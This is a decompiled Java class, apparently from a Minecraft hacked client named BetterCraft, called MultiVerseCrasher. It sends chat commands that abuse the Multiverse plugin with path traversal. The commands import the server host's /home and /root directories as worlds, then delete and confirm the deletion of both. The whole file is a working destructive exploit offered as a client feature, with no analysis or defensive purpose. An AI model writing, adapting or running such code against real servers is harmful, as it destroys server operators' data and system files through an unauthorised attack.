/*    */ package me.nzxter.bettercraft.mods.crasher;
/*    */ import net.minecraft.client.Minecraft;
/*    */ import net.minecraft.network.Packet;
/*    */ import net.minecraft.network.play.client.CPacketChatMessage;
/*    */ 
/*    */ public class MultiVerseCrasher {
/*    */   public static void start() {
/*  8 */     (Minecraft.getMinecraft()).player.connection.sendPacket((Packet)new CPacketChatMessage("/mv import ../../../../../home normal -t flat"));
/*  9 */     (Minecraft.getMinecraft()).player.connection.sendPacket((Packet)new CPacketChatMessage("/mv import ../../../../../root normal -t flat"));
/* 10 */     (Minecraft.getMinecraft()).player.connection.sendPacket((Packet)new CPacketChatMessage("/mv delete ../../../../../home"));
/* 11 */     (Minecraft.getMinecraft()).player.connection.sendPacket((Packet)new CPacketChatMessage("/mv confirm"));
/* 12 */     (Minecraft.getMinecraft()).player.connection.sendPacket((Packet)new CPacketChatMessage("/mv delete ../../../../../root"));
/* 13 */     (Minecraft.getMinecraft()).player.connection.sendPacket((Packet)new CPacketChatMessage("/mv confirm"));
/*    */   }
/*    */ }


/* Location:              C:\Users\emlin\Desktop\BetterCraft.jar!\me\nzxter\bettercraft\mods\crasher\MultiVerseCrasher.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */